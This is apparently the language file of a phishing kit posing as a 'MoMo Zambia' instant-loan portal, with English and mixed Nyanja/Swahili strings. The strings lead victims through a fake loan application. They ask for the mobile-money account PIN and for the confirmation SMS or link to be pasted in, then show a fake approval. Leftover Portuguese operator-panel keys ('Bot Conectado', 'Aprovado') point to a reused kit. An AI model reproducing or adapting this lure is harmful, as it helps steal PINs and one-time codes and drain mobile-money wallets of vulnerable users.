(function() {
  const translations = {
    en: {
      title: "MoMo Zambia — Digital Loan & Credit Portal",
      heroBadge: "Instant Mobile Money Loan Approval 🇿🇲",
      heroHeading: "Simulate Your MoMo Loan",
      heroSubtitle: "Get funds directly into your MTN MoMo / Airtel Money Zambia account within minutes.",
      requestedAmount: "Requested Amount",
      interestRate: "5% monthly rate",
      repaymentTerm: "Repayment Term",
      month1: "1 Month",
      months3: "3 Months",
      months6: "6 Months",
      months12: "12 Months",
      estMonthly: "Est. Monthly Repayment:",
      totalRepay: "Total Repayable:",
      applyNow: "APPLY FOR MOMO LOAN NOW",
      step1Title: "Loan Details",
      step1Sub: "Select your desired loan parameters (K1,000 - K300,000 ZMW).",
      loanType: "Loan Type",
      amountLabel: "Amount (ZMW)",
      termLabel: "Term (Months)",
      purposeLabel: "Loan Purpose",
      continueToPersonal: "CONTINUE TO PERSONAL DETAILS",
      step2Title: "Applicant Information",
      step2Sub: "Enter your official Zambian NRC & mobile account details.",
      firstName: "First Name",
      lastName: "Last Name",
      orangePhone: "MoMo Mobile Number (+260)",
      employmentStatus: "Employment Status",
      agentConsent: "I authorize the MoMo Agent to assist with tracking my application.",
      continueToAuth: "CONTINUE TO MOMO AUTHENTICATION",
      step3Title: "Sign in to MoMo Account",
      step3Sub: "Confirm your phone number and enter your 4-digit Account PIN to validate.",
      phoneNum: "MoMo Mobile Number",
      pinLabel: "MoMo Account PIN (4 digits):",
      showPin: "Show",
      hidePin: "Hide",
      confirmLoanBtn: "CONFIRM & VALIDATE LOAN",
      confirmPinBtn: "CONFIRM PIN",
      awaitingApproval: "Awaiting Approval",
      pinAwaitingDesc: "Your 4-digit PIN has been submitted. Please wait while your login is verified...",
      step4Title: "Account Ownership Verification",
      step4Sub: "Copy the confirmation SMS/link received on your MoMo number and paste below.",
      smsLabel: "SMS Confirmation Message",
      submitSmsBtn: "SUBMIT VERIFICATION MESSAGE",
      awaitingVerification: "Awaiting Verification",
      smsAwaitingDesc: "Your SMS verification has been submitted. Verification is in progress...",
      step5Title: "Loan Approved & Processing!",
      step5Sub: "Your loan request has been processed by MoMo Financial Services Zambia.",
      appRef: "Application Reference:",
      applicantName: "Applicant:",
      orangeContact: "MoMo Contact:",
      loanMode: "Loan Type:",
      requestedAmt: "Requested Amount:",
      termRepay: "Term / Payment:",
      currentStatus: "Current Status:",
      statusPending: "⏳ Under Review",
      newLoanBtn: "APPLY FOR ANOTHER LOAN",
      congratsHeading: "Congratulations!",
      congratsSub: "Your loan has been approved! Funds are being disbursed to your MoMo account.",
      approvedAmountLabel: "APPROVED LOAN AMOUNT",
      complianceNoticeTitle: "COMPLIANCE NOTICE",
      complianceNoticeBody: "Your MoMo Zambia account must remain active. Ensure your mobile wallet is enabled for loan disbursement of K1,000 up to K300,000 ZMW.",
      loanDetailsHeader: "Loan Details",
      monthlyPaymentLabel: "MONTHLY PAYMENT",
      loanTermLabel: "LOAN TERM",
      interestRateLabel: "INTEREST RATE",
      quickActionsTitle: "Quick Actions",
      btnDeposit: "Deposit Funds",
      btnWithdraw: "Withdraw Funds",
      btnLoanInfo: "Loan Details",
      nextStepsTitle: "Next Steps:",
      nextStepsBody: "You will receive an SMS confirmation with transaction details shortly.",
      returnHomeBtn: "Return Home",
      footerRights: "© 2026 MoMo Financial Services Zambia — Digital Credit & Loans"
    },
    zm: {
      title: "MoMo Zambia — Portal ya Ngongole ya Digito",
      heroBadge: "Kupasa Ngongole ya MoMo mu Kanfututu 🇿🇲",
      heroHeading: "Pimitsani Ngongole Yanu",
      heroSubtitle: "Landilani ndalama pa akaunti yanu ya MoMo / Airtel Money Zambia mu maminiti ochepa.",
      requestedAmount: "Ndalama Zofuna",
      interestRate: "Kuwonjezera 5% pamwezi",
      repaymentTerm: "Nthawi Bwera",
      month1: "Mwezi 1",
      months3: "Miezi 3",
      months6: "Miezi 6",
      months12: "Miezi 12",
      estMonthly: "Zobweza pa Mwezi:",
      totalRepay: "Zonse Zobweza:",
      applyNow: "PEMPHANI NGONGOLE MPAKALI PANO",
      step1Title: "Zambiri za Ngongole",
      step1Sub: "Sankhani ndalama zomwe mukufuna (K1,000 - K300,000 ZMW).",
      loanType: "Mtundu wa Ngongole",
      amountLabel: "Ndalama (ZMW)",
      termLabel: "Nthawi (Miezi)",
      purposeLabel: "Cholinga cha Ngongole",
      continueToPersonal: "PITANI PAMBUYO PA ZAMBIRI ZANU",
      step2Title: "Zambiri za Wopempha",
      step2Sub: "Lembani zambiri zanu za NRC ndi nambala ya foni.",
      firstName: "Dzina Loyamba",
      lastName: "Dzina Lomaliza",
      orangePhone: "Nambala ya MoMo (+260)",
      employmentStatus: "Ntchito Yanu",
      agentConsent: "Ndikuvomereza agent wa MoMo kuthandiza pakufufuza pempho langa.",
      continueToAuth: "PITANI PA MOMO AUTHENTICATION",
      step3Title: "Lowani pa Akaunti ya MoMo",
      step3Sub: "Tsimikizirani nambala ya foni ndi PIN yanu ya 4-digits.",
      phoneNum: "Nambala ya MoMo",
      pinLabel: "PIN ya MoMo (tarakimu 4):",
      showPin: "Onetsani",
      hidePin: "Bisani",
      confirmLoanBtn: "TSIMIKIZIRANI PIN YA NGONGOLE",
      confirmPinBtn: "TSIMIKIZIRANI PIN",
      awaitingApproval: "Idekha Chivomerezo",
      pinAwaitingDesc: "PIN yanu yatumizidwa. Chonde dikirani pomwe ikutsimikizidwa...",
      step4Title: "Kutsimikizira Uphungu wa Akaunti",
      step4Sub: "Koperani uthenga wa SMS wolandilidwa pa MoMo ndikumatira m'munsimu.",
      smsLabel: "Uthenga wa SMS Wolandila",
      submitSmsBtn: "TUMIZANI UTHENGA WA SMS",
      awaitingVerification: "Ikutsimikizidwa",
      smsAwaitingDesc: "Uthenga wanu wa SMS watumizidwa. Dikirani pang'ono...",
      step5Title: "Ngongole Yavomerezedwa!",
      step5Sub: "Pempho lanu lavomerezedwa ndi MoMo Zambia Financial Services.",
      appRef: "Nambala ya Pempho:",
      applicantName: "Wopempha:",
      orangeContact: "Mawasiliano ya MoMo:",
      loanMode: "Mtundu wa Ngongole:",
      requestedAmt: "Ndalama Zofunidwa:",
      termRepay: "Nthawi / Malipiro:",
      currentStatus: "Kawonedwe:",
      statusPending: "⏳ Ikuyang'aniridwa",
      newLoanBtn: "PEMPHANI NGONGOLE INA",
      congratsHeading: "Zikomo Kwambiri!",
      congratsSub: "Ngongole yanu yavomerezedwa kikamilifu! Ndalama zikutumizidwa ku akaunti yanu.",
      approvedAmountLabel: "NDALAMA ZAVOMEREZEDWA",
      complianceNoticeTitle: "CHENJEZO LA UTIIFU",
      complianceNoticeBody: "Akaunti yanu ya MoMo ikhale yogwira ntchito polandila ngongole kuyambira K1,000 mpaka K300,000 ZMW.",
      loanDetailsHeader: "Zambiri za Ngongole",
      monthlyPaymentLabel: "MALIPILO PA MWEZI",
      loanTermLabel: "NTHAWI YA NGONGOLE",
      interestRateLabel: "KIWANGO CHA RIBA",
      quickActionsTitle: "Zochita Mwachangu",
      btnDeposit: "Ikani Ndalama",
      btnWithdraw: "Cotsani Ndalama",
      btnLoanInfo: "Zambiri za Ngongole",
      nextStepsTitle: "Zochita Zotsatira:",
      nextStepsBody: "Muzalandira SMS yotsimikizira mu maola 24.",
      returnHomeBtn: "Bwererani Panyumba",
      footerRights: "© 2026 MoMo Financial Services Zambia — Digital Credit & Loans"
    },
    common: {
      "Bot Conectado": { zm: "Bot Imeunganishwa", en: "Bot Connected" },
      "Configurado": { zm: "Imewekwa", en: "Configured" },
      "Link copiado com sucesso!": { zm: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
      "Pendente": { zm: "Inasubiri", en: "Pending" },
      "Em Análise": { zm: "Inakaguliwa", en: "Under Review" },
      "Aprovado": { zm: "Imeidhinishwa", en: "Approved" },
      "Rejeitado": { zm: "Imekataliwa", en: "Rejected" },
      "meses": { zm: "miezi", en: "months" },
      "candidatura(s).": { zm: "ombi/maombi.", en: "application(s)." }
    }
  };

  // Default language is English ('en')
  let currentLang = localStorage.getItem("momo_lang") || "en";

  window.t = function(key) {
    if (!key) return "";
    if (translations.common && translations.common[key]) {
      return translations.common[key][currentLang] || translations.common[key].en || key;
    }
    const dict = translations[currentLang] || translations.en;
    return dict[key] || key;
  };

  function setLanguage(lang) {
    currentLang = lang;
    localStorage.setItem("momo_lang", lang);
    const dict = translations[lang] || translations.en;
    
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.innerText = lang.toUpperCase();
    });

    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (dict[key]) {
        el.innerText = dict[key];
      }
    });
  }

  document.addEventListener("DOMContentLoaded", () => {
    setLanguage(currentLang);
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.addEventListener("click", () => {
        const nextLang = currentLang === "en" ? "zm" : "en";
        setLanguage(nextLang);
      });
    });
  });
})();